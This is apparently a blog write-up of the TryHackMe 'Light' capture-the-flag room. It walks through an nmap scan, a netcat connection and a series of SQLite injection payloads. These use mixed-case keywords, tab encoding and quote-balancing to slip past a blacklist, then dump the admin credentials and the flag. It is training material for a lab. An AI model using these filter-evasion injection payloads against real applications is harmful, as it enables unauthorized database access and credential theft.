---
title: "Light"
platform: "TryHackMe"
difficulty: "Medium"
date: 2024-02-20
tags: ["privilege-escalation", "web"]
---

## Info
  
![infocard](https://tryhackme-images.s3.amazonaws.com/room-icons/618b3fa52f0acc0061fb0172-1737140605838)

In this CTF challenge, I faced a SQLite-based application that seemed innocuous at first—until I discovered its strict input filters. The mission: bypass blacklists, exploit SQL injection, and uncover a hidden flag. Here’s how I navigated errors, obfuscation, and SQLite’s quirks to succeed.


## Reconnaissance

The initial reconnaissance was performed using **Nmap**, revealing the following open services:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 15:22 CET                                                                                                          
Stats: 0:00:50 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan                                                                                                 
Service scan Timing: About 50.00% done; ETC: 15:23 (0:00:49 remaining)                                                                                                      
Nmap scan report for 10.10.106.14                                                                                                                                           
Host is up (0.051s latency).                                                                                                                                                
                                                                                                                                                                            
PORT     STATE SERVICE VERSION                                                                                                                                              
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)                                                                                         
| ssh-hostkey:                                                                                                                                                              
|   3072 61:c5:06:f2:4a:20:5b:cd:09:4d:72:b0:a5:aa:ce:71 (RSA)                                                                                                              
|   256 51:e0:5f:fa:81:64:d3:d9:26:24:16:ca:45:94:c2:00 (ECDSA)                                                                                                             
|_  256 77:e1:36:3b:95:9d:e0:3e:0a:56:82:b2:9d:4c:fe:1a (ED25519)                                                                                                           
1337/tcp open  waste?                                                                                                                                                       
| fingerprint-strings:                                                                                                                                                      
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe:                          
|     Welcome to the Light database!                                                                                                                                        
|     Please enter your username:                                                                                                                                           
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest:                                                                                            
|     Welcome to the Light database!                                                                                                                                        
|     Please enter your username: Username not found.
|_    Please enter your username:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service
```

## **Phase 1: The Initial Struggle**

The challenge began with a network connection to the target: 

```bash
nc $ip 1337  
```  
The application greeted me with: 

```  
Welcome to the Light database!  
Please enter your username:  
```    

I entered given username **smokey** and it gives me password for User. (`smokey:vYQ5ngPpw8AdUmL`). This is database application so lets try SQL Injection Attack.  

**First Attempt**: 

```sql
' UNION SELECT null, table_name, null FROM information_schema.tables --
```  
**Response**:  
```  
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)  
```  
The error revealed that `--`, `/*`, and vertical tabs (`%0b`) were blocked. Worse, `information_schema.tables` didn’t exist—this wasn’t MySQL!  

---

## **Phase 2: Pivoting to SQLite**  

### **Obfuscation Trick #1: Mixed-Case Keywords** 

I bypassed keyword blacklists (`UNION`, `SELECT`) using mixed-case:  
```sql  
' UnIoN SeLeCt null, table_name, null FrOm information_schema.tables WhErE '1'='1  
```  
**Result**:  
```  
Error: no such table: information_schema.tables  
```  
This confirmed SQLite. Time to use its metadata tables.  

---

## **Phase 3: Bypassing Filters** 

### **Obfuscation Trick #2: Tabs Instead of Spaces**  
The app blocked spaces, so I replaced them with URL-encoded tabs (`%09`):  
```sql  
' UniOn%09SelEct%09null,name,null%09FrOm%09sqlite_master%09WhErE%09type='table'  
```  
**Result**: Syntax errors due to `%` encoding issues.  

### **Obfuscation Trick #3: Avoiding Comments**  
Since `--` was blocked, I terminated queries with `WHERE '1'='1`:  
```sql  
' UNION SELECT file FROM PRAGMA_database_list WHERE '1'='1  
```  
**Output**:  
```  
Password: /home/adrian/users.db  
```  
Bingo! The database file was `users.db`.  

---

## **Phase 4: Extracting Tables and Columns** 

### **Listing Tables**  
```sql  
' UnIoN SeLeCt name FROM sqlite_master WHERE type='table' AND '1'='1  
```  
**Result**:  
```  
Password: admintable  
```  
Later, I discovered `usertable`.  

### **Extracting Columns** 

For the `admintable`:  
```sql  
' UnIoN SeLeCt group_concat(name) FROM PRAGMA_table_info('admintable') WHERE '1'='1  
```  
**Output**:  
```  
Password: id,username,password  
```  

---

## **Phase 5: Dumping Credentials and the Flag** 

### **Admintable Exploit**  

```sql  
' UnIoN SeLeCt username || ':' || password FROM admintable WHERE '1'='1  
```  
**Result**:  
```  
Password: TryHackMeAdmin:mamZtAuMlrsEy5bp6q17  
```  
### **The Final Payload**  

To concatenate all data: 

```sql  
' UnIoN SeLeCt group_concat(username || ':' || password) FROM admintable WHERE '1'='1  
```  
**Flag Captured**:  

```  
Password: TryHackMeAdmin:mamZtAuMlrsEy5bp6q17,flag:THM{S********************O?}  
```  

---

## **Key Obfuscation Techniques**  

1. **Mixed-Case Keywords**: `UnIoN`, `SeLeCt` evaded keyword filters.  
2. **Tab Encoding**: Replaced spaces with `%09` to bypass space detection.  
3. **Avoiding Comments**: Used `WHERE '1'='1` instead of `--` or `#`.  
4. **Metadata Adaptation**: Leveraged `sqlite_master` and `PRAGMA` instead of `information_schema`.  

---

## **Why This Worked**  

- **SQLite’s Flexibility**: Its `PRAGMA` functions and `sqlite_master` table provided metadata access.  
- **Persistence**: Iterative testing and adjusting payloads based on errors.  
- **Filter Evasion**: Simple obfuscation defeated naive blacklists.  

---

## **Conclusion**  

1. **Adapt to the Database**: SQLite requires different syntax than MySQL/PostgreSQL.  
2. **Errors Are Clues**: Each failure refined my payload.  
3. **Obfuscation is Key**: Small tweaks can bypass restrictive filters.  

---
